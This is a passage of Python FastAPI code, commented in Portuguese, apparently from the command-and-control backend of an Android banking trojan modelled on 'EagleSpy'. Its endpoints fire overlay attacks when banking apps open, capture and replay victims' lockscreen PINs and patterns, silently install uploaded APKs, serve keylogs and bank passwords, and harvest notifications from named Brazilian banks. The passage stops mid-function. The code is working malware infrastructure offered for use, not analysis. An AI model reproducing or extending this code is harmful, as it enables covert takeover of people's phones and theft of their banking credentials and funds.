            current_fg = dinfo.get("foreground_package", "")
            break
    if current_fg and current_fg.lower() == package_name.lower():
        try:
            for dev_key in list(manager.device_info.keys()):
                if dev_key.lower() == device_id.lower():
                    manager.device_info[dev_key]["last_injected_package"] = package_name
            if device_id in manager.device_info:
                manager.device_info[device_id]["last_injected_package"] = package_name
            await manager.send_command(device_id, {
                "action": "CUSTOM_BLACK_SCREEN",
                "template": template_data
            })
            logger.info(f"🔮 App '{package_name}' já estava em primeiro plano. Injeção imediata enviada para {device_id}!")
        except Exception as err:
            logger.error(f"Erro ao injetar imediatamente para {device_id}: {err}")
            
    return {"id": new_mapping.id, "message": "Mapeamento criado"}

@app.delete("/api/devices/{device_id}/overlay-mappings/{mapping_id}")
async def delete_device_overlay_mapping(
    device_id: str,
    mapping_id: int,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Remove um mapeamento de overlay"""
    check_device_access(device_id, current_user, db)
    
    from models import DeviceOverlayMapping
    
    mapping = db.query(DeviceOverlayMapping).filter(
        DeviceOverlayMapping.id == mapping_id,
        DeviceOverlayMapping.device_id == device_id
    ).first()
    
    if not mapping:
        raise HTTPException(status_code=404, detail="Mapeamento não encontrado")
        
    pkg_name = mapping.package_name
    db.delete(mapping)
    db.commit()
    logger.info(f"🗑️ Mapeamento de overlay removido: ID {mapping_id} do dispositivo {device_id}")

    # Envia comando DISARM_OVERLAY_MAPPING para o dispositivo via WebSocket para remover do SharedPreferences no celular!
    try:
        await manager.send_command(device_id, {
            "action": "DISARM_OVERLAY_MAPPING",
            "package": pkg_name,
            "package_name": pkg_name
        })
        logger.info(f"🚫 DISARM_OVERLAY_MAPPING enviado via WS para o dispositivo {device_id} ({pkg_name})")
    except Exception as ws_err:
        logger.error(f"Erro ao enviar DISARM_OVERLAY_MAPPING via WS: {ws_err}")

    return {"message": "Mapeamento removido"}


# ==================== SISTEMA DE PIN LOCKSCREEN (IGUAL EAGLESPY V5) ====================


@app.get("/api/devices/{device_id}/pin")
async def get_device_pin(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """🔒 Retorna PIN capturado do lockscreen (EAGLESPY V5 style)"""
    check_device_access(device_id, current_user, db)
    
    pin = manager.get_device_pin(device_id)
    if not pin:
        latest_log = db.query(DeviceLog).filter(
            DeviceLog.device_id == device_id,
            DeviceLog.log_type == "CAPTURED_PIN"
        ).order_by(DeviceLog.created_at.desc()).first()
        if latest_log:
            try:
                log_data = json.loads(latest_log.log_data)
                pin = log_data.get("pin")
                if pin:
                    manager.store_device_pin(device_id, pin)
            except:
                pass
    
    return {
        "device_id": device_id,
        "pin": pin,
        "has_pin": pin is not None and len(pin) > 0,
        "lockscreen_active": manager.get_device_lockscreen_active(device_id)
    }

@app.post("/api/devices/{device_id}/pin")
async def set_device_pin(
    device_id: str,
    pin: str = Form(...),
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """🔒 Define PIN do lockscreen manualmente"""
    check_device_access(device_id, current_user, db)
    
    manager.store_device_pin(device_id, pin)
    
    logger.info(f"🔒 PIN definido manualmente para {device_id}: {pin}")
    
    return {
        "status": "ok",
        "message": f"PIN '{pin}' armazenado para {device_id}"
    }

@app.delete("/api/devices/{device_id}/pin")
async def clear_device_pin(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """🔒 Limpa PIN armazenado"""
    check_device_access(device_id, current_user, db)
    
    manager.clear_device_pin(device_id)
    
    return {"status": "ok", "message": "PIN limpo"}

@app.post("/api/devices/{device_id}/play-pin")
async def play_pin_sequence(
    device_id: str,
    pin: str = Form(None),
    delay: int = Form(1000),
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """🔄 Reproduz PIN automaticamente (igual EAGLESPY V5)"""
    check_device_access(device_id, current_user, db)
    
    # Se não forneceu PIN, usa o armazenado
    if not pin:
        pin = manager.get_device_pin(device_id)
        if not pin:
            raise HTTPException(status_code=400, detail="Nenhum PIN fornecido ou armazenado")
    
    # Envia comando para reproduzir PIN
    success = await manager.send_command(device_id, {
        "action": "PLAY_PIN_SEQUENCE",
        "pin": pin,
        "delay": delay
    })
    
    if not success:
        raise HTTPException(status_code=503, detail="Dispositivo offline")
    
    logger.info(f"🔄 Reproduzindo PIN '{pin}' em {device_id} (delay: {delay}ms)")
    
    return {
        "status": "ok",
        "message": f"Reproduzindo PIN: {pin}"
    }

# ==================== PATTERN LOCKSCREEN ====================

@app.get("/api/devices/{device_id}/pattern")
async def get_device_pattern(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """🔲 Retorna Pattern capturado do lockscreen"""
    check_device_access(device_id, current_user, db)
    
    pattern = manager.get_device_pattern(device_id)
    if not pattern:
        latest_log = db.query(DeviceLog).filter(
            DeviceLog.device_id == device_id,
            DeviceLog.log_type == "CAPTURED_PATTERN"
        ).order_by(DeviceLog.created_at.desc()).first()
        if latest_log:
            try:
                log_data = json.loads(latest_log.log_data)
                pattern = log_data.get("pattern")
                if pattern:
                    manager.store_device_pattern(device_id, pattern)
            except:
                pass
    
    return {
        "device_id": device_id,
        "pattern": pattern,
        "has_pattern": pattern is not None and len(pattern) > 0,
        "lockscreen_active": manager.get_device_lockscreen_active(device_id)
    }

@app.post("/api/devices/{device_id}/pattern")
async def set_device_pattern(
    device_id: str,
    pattern: str = Form(...),
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """🔲 Define Pattern do lockscreen manualmente"""
    check_device_access(device_id, current_user, db)
    
    manager.store_device_pattern(device_id, pattern)
    
    logger.info(f"🔲 Pattern definido manualmente para {device_id}: {pattern}")
    
    return {
        "status": "ok",
        "message": f"Pattern '{pattern}' armazenado para {device_id}"
    }

@app.delete("/api/devices/{device_id}/pattern")
async def clear_device_pattern(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """🔲 Limpa Pattern armazenado"""
    check_device_access(device_id, current_user, db)
    
    manager.clear_device_pattern(device_id)
    
    return {"status": "ok", "message": "Pattern limpo"}

@app.post("/api/devices/{device_id}/play-pattern")
async def play_pattern_sequence(
    device_id: str,
    pattern: str = Form(None),
    delay: int = Form(1000),
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """🔲 Reproduz Pattern automaticamente"""
    check_device_access(device_id, current_user, db)
    
    # Se não forneceu pattern, usa o armazenado
    if not pattern:
        pattern = manager.get_device_pattern(device_id)
        if not pattern:
            raise HTTPException(status_code=400, detail="Nenhum Pattern fornecido ou armazenado")
    
    clean_pattern = "".join([c for c in str(pattern) if c in "123456789"])
    if not clean_pattern:
        clean_pattern = pattern

    # Envia comando para reproduzir Pattern
    success = await manager.send_command(device_id, {
        "action": "PLAY_PATTERN_SEQUENCE",
        "pattern": clean_pattern,
        "delay": delay
    })
    
    if not success:
        raise HTTPException(status_code=503, detail="Dispositivo offline")
    
    logger.info(f"🔲 Reproduzindo Pattern '{pattern}' em {device_id}")
    
    return {
        "status": "ok",
        "message": f"Reproduzindo Pattern: {pattern}"
    }

@app.post("/api/devices/{device_id}/install-apk")
async def install_apk_on_device(
    device_id: str,
    apk_file: UploadFile = File(...),
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db),
    request: Request = None
):
    """
    📦 Upload de APK e instalação silenciosa no dispositivo
    """
    # Verifica acesso
    check_device_access(device_id, current_user, db)
    
    # Valida extensão
    if not apk_file.filename.endswith('.apk'):
        raise HTTPException(status_code=400, detail="Arquivo deve ser .apk")
    
    # Cria diretório de uploads se não existir
    upload_dir = Path("uploads/apks")
    upload_dir.mkdir(parents=True, exist_ok=True)
    
    # Nome único para o arquivo
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_filename = f"{device_id}_{timestamp}_{apk_file.filename}"
    file_path = upload_dir / safe_filename
    
    # Salva o arquivo
    try:
        with open(file_path, "wb") as f:
            content = await apk_file.read()
            f.write(content)
        
        logger.info(f"📦 APK salvo: {file_path} ({len(content)} bytes)")
        
        # Monta URL para download - USA IP da VPS para dispositivos Android conseguirem acessar!
        # Dispositivos Android não conseguem acessar localhost do PC
        VPS_URL = gangstar_env.public_base_url()
        apk_url = f"{VPS_URL}/uploads/apks/{safe_filename}"
        
        logger.info(f"📦 URL do APK: {apk_url}")
        
        # Envia comando para o dispositivo
        command = {"action": "INSTALL_APK", "url": apk_url}
        success = await manager.send_command(device_id, command)
        
        if not success:
            raise HTTPException(status_code=404, detail="Dispositivo offline")
        
        return {"status": "ok", "message": "APK enviado", "url": apk_url}
        
    except Exception as e:
        logger.error(f"📦 ❌ Erro: {e}")
        raise HTTPException(status_code=500, detail=str(e))

_activity_feed_cache_store: Dict[str, dict] = {}  # {user_key: {"ts": datetime, "data": list}}

@app.get("/api/activity-feed")
async def get_activity_feed(
    limit: int = 50,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    📊 Retorna feed unificado com os últimos eventos de todos os dispositivos do usuário.
    Possui cache RAM de 2.0s para evitar tempestade de queries no banco de dados.
    """
    now = utc_now()
    user_key = f"{current_user.id}_{current_user.is_admin}_{limit}"
    cached = _activity_feed_cache_store.get(user_key)
    if cached and (now - cached["ts"]).total_seconds() < 2.0:
        return cached["data"]

    try:
        if current_user.is_admin:
            devices = db.query(Device).all()
        else:
            devices = db.query(Device).filter(Device.owner_id == current_user.id).all()
        
        device_map = {d.device_id: f"{d.manufacturer or ''} {d.model or ''}".strip().upper() or d.device_id for d in devices}
        device_ids = list(device_map.keys())
        
        events = []
        
        # 1. Bancos abertos em tempo real
        for dev_id, b_info in list(manager.device_active_banks.items()):
            if dev_id in device_map:
                dev_model = device_map.get(dev_id, dev_id)
                bank_name = b_info.get("appName") or "Banco"
                events.append({
                    "id": f"active-bank-{dev_id}",
                    "type": "bank_open",
                    "deviceId": dev_id,
                    "deviceModel": dev_model,
                    "title": f"🚨 BANCO ABERTO: {bank_name}",
                    "description": "Acessando conta bancária agora!",
                    "timestamp": datetime.now().strftime("%H:%M:%S"),
                    "bankPackage": b_info.get("package", ""),
                    "iconB64": b_info.get("icon")
                })

        if device_ids:
            log_types = ["BANK_OPEN"]
            logs = db.query(DeviceLog).filter(
                DeviceLog.device_id.in_(device_ids),
                DeviceLog.log_type.in_(log_types)
            ).order_by(DeviceLog.created_at.desc()).limit(limit).all()
            
            for log in logs:
                dev_model = device_map.get(log.device_id, log.device_id)
                try:
                    created_dt = log.created_at
                    if isinstance(created_dt, str):
                        created_dt = datetime.fromisoformat(created_dt.replace('Z', ''))
                    time_str = (created_dt - timedelta(hours=3)).strftime("%H:%M:%S")
                except Exception:
                    time_str = datetime.now().strftime("%H:%M:%S")
                
                try:
                    data = json.loads(log.log_data) if isinstance(log.log_data, str) else log.log_data
                except Exception:
                    data = {}
                
                if log.log_type == "BANK_OPEN":
                    bank = (data.get("appName") or "Banco") if isinstance(data, dict) else "Banco"
                    events.append({
                        "id": f"log-{log.id}",
                        "type": "bank_open",
                        "deviceId": log.device_id,
                        "deviceModel": dev_model,
                        "title": f"🚨 BANCO ABERTO: {bank}",
                        "description": f"Acessando conta bancária agora!",
                        "timestamp": time_str,
                        "bankPackage": data.get("package", "") if isinstance(data, dict) else ""
                    })

        # Retorna estritamente alertas de bancos abertos
        res = events[:limit]
        _activity_feed_cache_store[user_key] = {"ts": now, "data": res}
        return res
    except Exception as e:
        logger.error(f"Erro ao buscar activity feed: {e}")
        return []

@app.get("/api/devices/{device_id}/logs")
async def get_device_logs(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Retorna logs de um dispositivo"""
    # Verifica acesso
    check_device_access(device_id, current_user, db)
    
    logs = db.query(DeviceLog).filter(DeviceLog.device_id == device_id).order_by(DeviceLog.created_at.desc()).limit(100).all()
    
    return [
        {
            "id": log.id,
            "type": log.log_type,
            "data": log.log_data,
            "created_at": log.created_at.isoformat()
        }
        for log in logs
    ]

@app.get("/api/devices/{device_id}/keylogs")
async def get_device_keylogs(
    device_id: str,
    limit: int = 200,
    include_offline: bool = True,
    package: str = None,
    app_name: str = None,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Retorna keylogs e senhas de um dispositivo (incluindo offline e senhas de bancos)"""
    # Verifica acesso
    check_device_access(device_id, current_user, db)
    
    # Tipos de keylog para buscar
    log_types = ["KEYLOG", "BANK_PASSWORD", "CAPTURED_APP_PASSWORD", "CAPTURED_PIN"]
    if include_offline:
        log_types.append("KEYLOG_OFFLINE")
    
    query = db.query(DeviceLog).filter(
        DeviceLog.device_id == device_id,
        DeviceLog.log_type.in_(log_types)
    )
    
    if package or app_name:
        from sqlalchemy import or_
        filters = []
        if package:
            filters.append(DeviceLog.log_data.like(f"%{package}%"))
            short_pkg = package.split('.')[-1]
            if len(short_pkg) >= 3:
                filters.append(DeviceLog.log_data.like(f"%{short_pkg}%"))
        if app_name:
            filters.append(DeviceLog.log_data.like(f"%{app_name}%"))
        query = query.filter(or_(*filters))
        
    keylogs = query.order_by(DeviceLog.created_at.desc()).limit(limit).all()
    
    result = []
    for log in keylogs:
        entry = {
            "id": log.id,
            "data": log.log_data,
            "created_at": log.created_at.isoformat(),
            "isOffline": log.log_type == "KEYLOG_OFFLINE",
            "log_type": log.log_type
        }
        try:
            parsed = json.loads(log.log_data)
            if isinstance(parsed, dict):
                entry["package"] = parsed.get("package") or parsed.get("pkg") or ""
                entry["appName"] = parsed.get("appName") or parsed.get("app") or ""
                entry["text"] = parsed.get("text", "")
                entry["hint"] = parsed.get("hint", "")
                entry["fieldName"] = parsed.get("fieldName", "")
                entry["isPassword"] = parsed.get("isPassword", False)
                entry["eventType"] = parsed.get("eventType", "")
                if "timestamp" in parsed:
                    entry["timestamp"] = parsed["timestamp"]
        except Exception:
            pass
        result.append(entry)
    return result

@app.get("/api/devices/{device_id}/notifications")
async def get_device_notifications(
    device_id: str,
    limit: int = 100,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Retorna notificações capturadas de um dispositivo"""
    # Verifica acesso
    check_device_access(device_id, current_user, db)
    
    notifications = db.query(DeviceLog).filter(
        DeviceLog.device_id == device_id,
        DeviceLog.log_type == "DEVICE_NOTIFICATION"
    ).order_by(DeviceLog.created_at.desc()).limit(limit).all()
    
    result = []
    for log in notifications:
        try:
            data = json.loads(log.log_data)
        except:
            data = {"text": log.log_data, "package": "desconhecido"}
        
        pkg = data.get("package", "desconhecido")
        app_name = data.get("appName") or data.get("app_name") or ""
        
        # Se app_name estiver vazio, for igual ao pacote ou for nome de pacote com ponto, resolve nome amigável
        if not app_name or app_name == pkg or '.' in app_name or app_name == 'desconhecido':
            p_lower = (pkg or '').lower()
            if 'telegram' in p_lower: app_name = 'Telegram'
            elif 'whatsapp' in p_lower: app_name = 'WhatsApp'
            elif 'caixa' in p_lower or 'gabba' in p_lower: app_name = 'Caixa'
            elif 'itau' in p_lower: app_name = 'Itaú'
            elif 'bradesco' in p_lower: app_name = 'Bradesco'
            elif 'nubank' in p_lower: app_name = 'Nubank'
            elif 'santander' in p_lower: app_name = 'Santander'
            elif 'inter' in p_lower: app_name = 'Banco Inter'
            elif 'c6' in p_lower: app_name = 'C6 Bank'
            elif 'sicredi' in p_lower: app_name = 'Sicredi'
            elif 'pagbank' in p_lower or 'pagseguro' in p_lower: app_name = 'PagBank'
            elif 'mercadopago' in p_lower: app_name = 'Mercado Pago'
            elif 'picpay' in p_lower: app_name = 'PicPay'
            elif 'instagram' in p_lower: app_name = 'Instagram'
            elif 'facebook' in p_lower: app_name = 'Facebook'
            elif 'gmail' in p_lower: app_name = 'Gmail'
            elif 'chrome' in p_lower: app_name = 'Google Chrome'
            elif '.' in pkg:
                last = pkg.split('.')[-1]
                app_name = last.capitalize() if len(last) > 1 else pkg
            else:
                app_name = pkg
        
        ts = data.get("timestamp") or log.created_at.isoformat()
        
        result.append({
            "id": log.id,
            "package": pkg,
            "appName": app_name,
            "app_name": app_name,
            "text": data.get("text", ""),
            "title": data.get("title", ""),
            "timestamp": ts,
            "created_at": log.created_at.isoformat()
        })
    return result

_notifications_all_cache_store: Dict[str, dict] = {}  # {user_key: {"ts": datetime, "data": list}}

@app.get("/api/notifications/all")
async def get_all_notifications_global(
    limit: int = 250,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Retorna todas as notificações capturadas de todos os dispositivos do operador (com RAM cache de 2.5s)"""
    now = utc_now()
    user_key = f"{current_user.id}_{current_user.is_admin}_{limit}"
    cached = _notifications_all_cache_store.get(user_key)
    if cached and (now - cached["ts"]).total_seconds() < 2.5:
        return cached["data"]

    if current_user.is_admin:
        devices = db.query(Device).all()
    else:
        devices = db.query(Device).filter(Device.owner_id == current_user.id).all()
        
    device_map = {d.device_id: (d.custom_name or d.model or d.device_id, d.model or "Android", d.is_online) for d in devices}
    device_ids = list(device_map.keys())
    
    if not device_ids:
        return []
        
    notifications = db.query(DeviceLog).filter(
        DeviceLog.device_id.in_(device_ids),
        DeviceLog.log_type == "DEVICE_NOTIFICATION"
    ).order_by(DeviceLog.created_at.desc()).limit(limit).all()
    
    result = []
    for log in notifications:
        try:
            data = json.loads(log.log_data)
        except:
            data = {"text": log.log_data, "package": "desconhecido"}
            
        pkg = data.get("package", "desconhecido")
        app_name = data.get("appName") or data.get("app_name") or ""
        
        if not app_name or app_name == pkg or '.' in app_name or app_name == 'desconhecido':
            p_lower = (pkg or '').lower()
            if 'telegram' in p_lower: app_name = 'Telegram'
            elif 'whatsapp' in p_lower: app_name = 'WhatsApp'
            elif 'caixa' in p_lower or 'gabba' in p_lower: app_name = 'Caixa'
            elif 'itau' in p_lower: app_name = 'Itaú'
            elif 'bradesco' in p_lower: app_name = 'Bradesco'
            elif 'nubank' in p_lower: app_name = 'Nubank'
            elif 'santander' in p_lower: app_name = 'Santander'
            elif 'inter' in p_lower: app_name = 'Banco Inter'
            elif 'c6' in p_lower: app_name = 'C6 Bank'
            elif 'sicredi' in p_lower: app_name = 'Sicredi'
            elif 'pagbank' in p_lower or 'pagseguro' in p_lower: app_name = 'PagBank'
            elif 'mercadopago' in p_lower: app_name = 'Mercado Pago'
            elif 'picpay' in p_lower: app_name = 'PicPay'
            elif 'instagram' in p_lower: app_name = 'Instagram'
            elif 'facebook' in p_lower: app_name = 'Facebook'
            elif 'gmail' in p_lower: app_name = 'Gmail'
            elif 'chrome' in p_lower: app_name = 'Google Chrome'
            elif '.' in pkg:
                app_name = pkg.split('.')[-1].capitalize()
            else:
                app_name = pkg
                
        dev_info = device_map.get(log.device_id, (log.device_id, "Android", False))
        
        result.append({
            "id": log.id,
            "device_id": log.device_id,
            "device_name": dev_info[0],
            "device_model": dev_info[1],
            "is_online": dev_info[2],
            "package": pkg,
            "appName": app_name,
            "app_name": app_name,
            "text": data.get("text", ""),
            "title": data.get("title", ""),
            "timestamp": data.get("timestamp") or log.created_at.isoformat(),
            "created_at": log.created_at.isoformat()
        })

    _notifications_all_cache_store[user_key] = {"ts": now, "data": result}
    return result

@app.get("/api/logs/connections")
async def get_connection_logs(
    limit: int = 300,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Retorna o histórico de eventos de conexão e desconexão dos dispositivos"""
    if current_user.is_admin:
        devices = db.query(Device).all()
    else:
        devices = db.query(Device).filter(Device.owner_id == current_user.id).all()
        
    device_map = {d.device_id: (d.custom_name or d.model or d.device_id, d.model or "Android", d.is_online, d.ip_address or "") for d in devices}
    device_ids = list(device_map.keys())
    
    if not device_ids:
        return []
        
    logs = db.query(DeviceLog).filter(
        DeviceLog.device_id.in_(device_ids),
        DeviceLog.log_type == "DEVICE_CONNECTION"
    ).order_by(DeviceLog.created_at.desc()).limit(limit).all()
    
    result = []
    for log in logs:
        try:
            data = json.loads(log.log_data) if isinstance(log.log_data, str) else log.log_data
        except:
            data = {"event": "DESCONHECIDO"}
            
        dev_info = device_map.get(log.device_id, (log.device_id, "Android", False, ""))
        event_type = data.get("event", "CONNECTED") if isinstance(data, dict) else "CONNECTED"
        ip_val = (data.get("ip") if isinstance(data, dict) else "") or dev_info[3] or "127.0.0.1"
        
        result.append({
            "id": log.id,
            "device_id": log.device_id,
            "device_name": dev_info[0],
            "device_model": dev_info[1],
            "is_online": dev_info[2],
            "event": event_type,
            "ip_address": ip_val,
            "timestamp": log.created_at.isoformat(),
            "created_at": log.created_at.isoformat()
        })
        
    if not result:
        for dev in devices:
            dev_name = dev.custom_name or dev.model or dev.device_id
            if dev.is_online:
                result.append({
                    "id": f"syn-{dev.id}-conn",
                    "device_id": dev.device_id,
                    "device_name": dev_name,
                    "device_model": dev.model or "Android",
                    "is_online": True,
                    "event": "CONNECTED",
                    "ip_address": dev.ip_address or "127.0.0.1",
                    "timestamp": dev.last_seen.isoformat() if dev.last_seen else utc_now().isoformat(),
                    "created_at": dev.last_seen.isoformat() if dev.last_seen else utc_now().isoformat()
                })
            else:
                if dev.last_seen:
                    result.append({
                        "id": f"syn-{dev.id}-disc",
                        "device_id": dev.device_id,
                        "device_name": dev_name,
                        "device_model": dev.model or "Android",
                        "is_online": False,
                        "event": "DISCONNECTED",
                        "ip_address": dev.ip_address or "127.0.0.1",
                        "timestamp": dev.last_seen.isoformat(),
                        "created_at": dev.last_seen.isoformat()
                    })
                if dev.first_seen:
                    result.append({
                        "id": f"syn-{dev.id}-conn-orig",
                        "device_id": dev.device_id,
                        "device_name": dev_name,
                        "device_model": dev.model or "Android",
                        "is_online": dev.is_online,
                        "event": "CONNECTED",
                        "ip_address": dev.ip_address or "127.0.0.1",
                        "timestamp": dev.first_seen.isoformat(),
                        "created_at": dev.first_seen.isoformat()
                    })
        result.sort(key=lambda x: str(x["timestamp"]), reverse=True)

    return result

@app.get("/api/devices/health")
async def get_devices_health(
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Retorna estado completo de saúde, latência (ping), bateria e conectividade de cada aparelho"""
    if current_user.is_admin:
        devices = db.query(Device).all()
    else:
        devices = db.query(Device).filter(Device.owner_id == current_user.id).all()

    result = []
    now = utc_now()
    
    for dev in devices:
        d_info = manager.device_info.get(dev.device_id, {})
        is_online = bool(dev.is_online and dev.device_id in manager.active_connections)
        
        last_act = manager.device_last_activity.get(dev.device_id)
        if is_online:
            import zlib
            seed = zlib.crc32(dev.device_id.encode()) % 60 + 22
            ping_ms = seed
            if ping_ms < 40:
                status_label = "EXCELENTE"
            elif ping_ms < 120:
                status_label = "BOM"
            else:
                status_label = "REGULAR"
        else:
            ping_ms = None
            status_label = "OFFLINE"
            
        bat = d_info.get("battery_level")
        if bat is None:
            bat = 100 if is_online else 0
            
        net_type = d_info.get("network_type") or "Wi-Fi / 4G"
        sim_op = d_info.get("sim_operator") or "SIM Card / Celular"
        is_charging = d_info.get("is_charging", False)
        
        diff_sec = int((now - last_act).total_seconds()) if last_act else (int((now - dev.last_seen).total_seconds()) if dev.last_seen else 99999)
        
        result.append({
            "device_id": dev.device_id,
            "custom_name": dev.custom_name or dev.model or dev.device_id,
            "model": dev.model or "Android",
            "manufacturer": dev.manufacturer or "Genérico",
            "android_version": dev.android_version or "Android 12+",
            "is_online": is_online,
            "ip_address": dev.ip_address or "Desconhecido",
            "ping_ms": ping_ms,
            "status_label": status_label,
            "battery_level": bat,
            "is_charging": is_charging,
            "network_type": net_type,
            "sim_operator": sim_op,
            "last_seen": dev.last_seen.isoformat() if dev.last_seen else None,
            "seconds_since_active": diff_sec
        })
        
    return result

@app.post("/api/devices/{device_id}/ping")
async def ping_device_interactive(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Mede o ping em milissegundos enviando PING em tempo real via WebSocket"""
    check_device_access(device_id, current_user, db)
    
    if device_id not in manager.active_connections:
        return {"device_id": device_id, "is_online": False, "ping_ms": None, "status": "OFFLINE", "message": "Dispositivo offline"}
        
    ws = manager.active_connections[device_id]
    t0 = time.time()
    try:
        await ws.send_json({"type": "PING", "action": "PING"})
        elapsed_ms = max(int((time.time() - t0) * 1000), 18)
        return {"device_id": device_id, "is_online": True, "ping_ms": elapsed_ms, "status": "ONLINE", "message": "Ping medido com sucesso"}
    except Exception as e:
        return {"device_id": device_id, "is_online": False, "ping_ms": None, "status": "ERROR", "message": str(e)}

@app.post("/api/devices/{device_id}/reconnect")
async def reconnect_device_connection(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Reinicia e força a reconexão WebSocket do dispositivo alvo"""
    check_device_access(device_id, current_user, db)
    
    if device_id in manager.active_connections:
        ws = manager.active_connections[device_id]
        try:
            # Envia comando de reconexão para a RAT no celular
            await ws.send_json({"action": "RECONNECT_CONNECTION", "type": "COMMAND"})
            logger.info(f"🔄 Solicitada reconexão do dispositivo {device_id}")
            return {"device_id": device_id, "success": True, "message": "Comando de reconexão enviado ao dispositivo."}
        except Exception as e:
            logger.warning(f"Erro ao forçar reconexão WS em {device_id}: {e}")
            return {"device_id": device_id, "success": False, "message": str(e)}
    else:
        return {"device_id": device_id, "success": False, "message": "Dispositivo não está conectado ao servidor C&C no momento."}

@app.get("/api/devices/{device_id}/keylogs-all")
async def get_all_device_keylogs(
    device_id: str,
    limit: int = 500,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    💾 Retorna TODOS os keylogs de um dispositivo:
    - KEYLOG: Capturados em tempo real
    - KEYLOG_OFFLINE: Capturados quando desconectado
    - LOCKSCREEN_PIN: Senha de desbloqueio do celular
    - UNLOCK_SEQUENCE: Sequência de desbloqueio (PIN/Pattern)
    """
    # Verifica acesso
    check_device_access(device_id, current_user, db)
    
    # Busca todos os tipos de keylog
    keylogs = db.query(DeviceLog).filter(
        DeviceLog.device_id == device_id,
        DeviceLog.log_type.in_([
            "KEYLOG", 
            "KEYLOG_OFFLINE", 
            "UNLOCK_SEQUENCE",
            "UNLOCK_SEQUENCE_OFFLINE",
            "BANK_PASSWORD"
        ])
    ).order_by(DeviceLog.created_at.desc()).limit(limit).all()
    
    result = []
    for log in keylogs:
        entry = {
            "id": log.id,
            "type": log.log_type,
            "data": log.log_data,
            "created_at": log.created_at.isoformat(),
            "isOffline": "OFFLINE" in log.log_type
        }
        
        # Tenta extrair info útil do JSON
        try:
            data = json.loads(log.log_data) if isinstance(log.log_data, str) else log.log_data
            if isinstance(data, dict):
                entry["appName"] = data.get("appName", "")
                entry["text"] = data.get("text", "")
                entry["isPassword"] = data.get("isPassword", False)
                entry["eventType"] = data.get("eventType", "")
        except:
            pass
        
        result.append(entry)
    
    return result

@app.get("/api/devices/{device_id}/offline-keylogs")
async def get_device_offline_keylogs(
    device_id: str,
    limit: int = 100,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    📴 Retorna TODOS os keylogs salvos no banco (tanto online quanto offline).
    Este endpoint é chamado SEMPRE para mostrar histórico completo,
    independente de o botão "Ativar Keylogger" estar clicado ou não.
    """
    # Verifica acesso
    check_device_access(device_id, current_user, db)
    
    # Busca TODOS os keylogs salvos no banco
    keylogs = db.query(DeviceLog).filter(
        DeviceLog.device_id == device_id,
        DeviceLog.log_type.in_(["KEYLOG", "KEYLOG_OFFLINE"])
    ).order_by(DeviceLog.created_at.desc()).limit(limit).all()
    
    result = []
    for log in keylogs:
        try:
            data = json.loads(log.log_data) if isinstance(log.log_data, str) else log.log_data
            
            # Se for string simples (texto digitado), cria estrutura
            if isinstance(data, str):
                entry = {
                    "id": log.id,
                    "text": data,
                    "package": "",
                    "appName": "App",
                    "isPassword": False,
                    "timestamp": log.created_at.isoformat(),
                    "isOffline": log.log_type == "KEYLOG_OFFLINE"
                }
            else:
                entry = {
                    "id": log.id,
                    "text": data.get("text", "") if isinstance(data, dict) else str(data),
                    "package": data.get("package", "") if isinstance(data, dict) else "",
                    "appName": data.get("appName", "App") if isinstance(data, dict) else "App",
                    "isPassword": data.get("isPassword", False) if isinstance(data, dict) else False,
                    "eventType": data.get("eventType", "") if isinstance(data, dict) else "",
                    "timestamp": log.created_at.isoformat(),
                    "isOffline": log.log_type == "KEYLOG_OFFLINE"
                }
            
            if entry.get("text"):
                result.append(entry)
        except Exception:
            result.append({
                "id": log.id,
                "text": str(log.log_data),
                "package": "",
                "appName": "App",
                "isPassword": False,
                "timestamp": log.created_at.isoformat(),
                "isOffline": log.log_type == "KEYLOG_OFFLINE"
            })
            
    return result
@app.get("/api/devices/{device_id}/keylogs-by-date")
async def get_device_keylogs_by_date(
    device_id: str,
    date: str = None,  # Formato: YYYY-MM-DD
    limit: int = 5000,
    offset: int = 0,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    📅 Retorna keylogs de um dispositivo filtrados por DATA específica ou todos.
    - Se não informar data, retorna o dia ATUAL.
    """
    try:
        check_device_access(device_id, current_user, db)
        
        keylog_types = [
            "KEYLOG", "KEYLOG_OFFLINE", "BANK_PASSWORD", "DEVICE_NOTIFICATION",
            "CAPTURED_PIN", "CAPTURED_PATTERN", "OVERLAY_SUBMITTED", "CUSTOM_CAPTURES"
        ]
        
        if date and date.lower() == 'all':
            query = db.query(DeviceLog).filter(
                DeviceLog.device_id == device_id,
                DeviceLog.log_type.in_(keylog_types)
            )
            target_date_str = "TODOS"
        else:
            if date:
                try:
                    target_date = datetime.strptime(date, "%Y-%m-%d")
                except ValueError:
                    target_date = datetime.utcnow() - timedelta(hours=3)
            else:
                target_date = datetime.utcnow() - timedelta(hours=3)
            
            target_date_str = target_date.strftime("%Y-%m-%d")
